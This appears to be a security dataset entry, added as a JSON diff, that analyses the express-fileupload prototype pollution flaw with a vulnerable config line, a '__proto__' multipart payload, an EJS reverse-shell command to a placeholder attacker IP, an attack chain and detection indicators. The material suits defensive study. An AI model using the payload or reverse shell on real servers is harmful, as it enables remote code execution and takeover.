@@ -1,0 +1,127 @@
+{
+  "package_info": {
+    "package_name": "express-fileupload",
+    "package_manager": "npm",
+    "package_versions": "< 1.1.9",
+    "why_malicious": "The package contains a prototype pollution vulnerability when the 'parseNested' option is enabled. Attackers can craft multipart/form-data upload payloads with specially named fields (e.g., '__proto__') to manipulate JavaScript object prototypes. This can result in denial-of-service (DoS), corruption of application logic, or remote code execution (RCE) if downstream libraries such as EJS are used and their configuration is polluted."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when express-fileupload middleware is initialized with parseNested: true and a file upload is processed)",
+        "file_location": "Application code where express-fileupload middleware is configured (typically app.js or server.js)",
+        "required_permissions": [
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "app.use(fileUpload({ parseNested: true }));",
+      "code_language": "javascript",
+      "code_behavior": "Enables the vulnerable 'parseNested' option in express-fileupload, causing uploaded form fields to be parsed into nested objects. This allows user-supplied keys to be interpreted as object properties, including prototype properties, making the application susceptible to prototype pollution.",
+      "malice_analysis": {
+        "why_suspicious": "Enabling 'parseNested' without sanitizing field names allows attackers to inject special property names (like '__proto__') via file upload fields, leading to prototype pollution.",
+        "violated_expectations": "Normal file upload handling should not allow user input to modify JavaScript object prototypes or global application state.",
+        "similar_legitimate_use": "Flattening nested form data for easier access in application logic is legitimate, but only when field names are strictly validated and sanitized.",
+        "key_indicators": [
+          "Presence of 'parseNested: true' in express-fileupload configuration",
+          "Lack of sanitization or validation for uploaded field names",
+          "Direct mapping of user-supplied field names to object properties"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (when a crafted HTTP POST multipart/form-data upload is received and processed by express-fileupload)",
+        "file_location": "HTTP request payload processed by express-fileupload middleware",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "Content-Disposition: form-data; name=\"__proto__.toString\"; filename=\"filename\"\n\ncontent",
+      "code_language": "http",
+      "code_behavior": "Injects a property into the global Object prototype by using a specially crafted form field name. This can overwrite or add methods (such as 'toString') on all objects, leading to application errors, logic corruption, or enabling further exploitation.",
+      "malice_analysis": {
+        "why_suspicious": "User input should never be able to modify global object prototypes. This technique allows attackers to corrupt application logic, cause persistent errors, or set up for further exploitation such as RCE.",
+        "violated_expectations": "Normal file upload field names should not affect JavaScript internals or global object behavior.",
+        "similar_legitimate_use": "There is no legitimate use for user-supplied field names like '__proto__' or other prototype properties in file uploads.",
+        "key_indicators": [
+          "Multipart/form-data field names containing '__proto__' or similar prototype properties",
+          "Modification of Object.prototype properties at runtime",
+          "Unexpected changes to global object behavior after file upload"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (when a templating engine such as EJS is used after prototype pollution has occurred)",
+        "file_location": "EJS template rendering logic (downstream from polluted prototype, typically in view rendering code)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "child_process"
+        ]
+      },
+      "code_snippet": "Prototype pollution sets EJS outputFunctionName to a malicious value, causing EJS to execute: require('child_process').exec('bash -i >& /dev/tcp/attacker_ip/4444 0>&1')",
+      "code_language": "javascript",
+      "code_behavior": "Leverages polluted prototype to alter EJS configuration (such as outputFunctionName), resulting in execution of attacker-controlled shell commands. This can establish a reverse shell, granting the attacker remote access to the server.",
+      "malice_analysis": {
+        "why_suspicious": "Application logic is hijacked to execute arbitrary code via polluted configuration options, leading to full remote code execution. This is a direct consequence of prototype pollution combined with unsafe use of user-controlled configuration in templating engines.",
+        "violated_expectations": "Templating engines should never execute shell commands or load configuration from user-controlled or polluted sources.",
+        "similar_legitimate_use": "There is no legitimate use for user-controlled prototype properties to influence template engine configuration or cause code execution.",
+        "key_indicators": [
+          "Prototype pollution of template engine options (e.g., EJS outputFunctionName)",
+          "Execution of child_process or similar modules based on user-controlled or polluted data",
+          "Unexpected shell command execution during template rendering"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker uploads a file with a specially crafted field name (such as '__proto__.toString') via multipart/form-data to the vulnerable upload endpoint.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Prototype pollution of the global Object prototype, modifying properties such as 'toString' for all objects."
+    },
+    {
+      "step": 2,
+      "action": "The express-fileupload middleware, configured with parseNested: true, parses the payload and flattens the field names into nested objects, allowing the prototype to be polluted.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Corruption of application logic or setup for further exploitation, such as altering configuration of downstream libraries."
+    },
+    {
+      "step": 3,
+      "action": "If the application uses EJS (or a similar templating engine), the attacker further pollutes the prototype to alter EJS options, causing execution of arbitrary shell commands (e.g., establishing a reverse shell).",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Remote code execution and potential full compromise of the server."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Multipart/form-data uploads with field names containing '__proto__' or other prototype properties",
+      "Unexpected modification of Object.prototype properties at runtime (e.g., new or overwritten methods like 'toString')",
+      "Application errors (HTTP 500) or crashes on every request after a suspicious upload",
+      "Unexplained changes in application logic or behavior following file uploads"
+    ],
+    "file_indicators": [
+      "Presence of 'parseNested: true' in express-fileupload configuration files (e.g., app.js, server.js)",
+      "Unusual or malformed field names (such as '__proto__', 'constructor', 'prototype') in upload logs or request payloads",
+      "Audit logs showing changes to global object properties after file uploads"
+    ],
+    "network_indicators": [
+      "Outbound connections from the server to external IPs/ports (e.g., reverse shell to attacker-controlled IP)",
+      "Unusual HTTP POST requests with multipart/form-data targeting upload endpoints, especially with suspicious field names",
+      "Unexpected DNS lookups or connections initiated by the application process after file uploads"
+    ],
+    "how_to_detect": "Monitor for multipart/form-data uploads with field names containing '__proto__', 'constructor', or other prototype properties. Audit application code and configuration for use of 'parseNested: true' in express-fileupload. Analyze upload logs for suspicious or malformed field names. Watch for sudden, repeated HTTP 500 errors or application crashes after uploads. Instrument runtime to detect and alert on modifications to Object.prototype or other global objects. Monitor for unexpected outbound network connections from the server, especially following file uploads. Combine these indicators to trigger alerts and block exploitation attempts."
+  }
+}
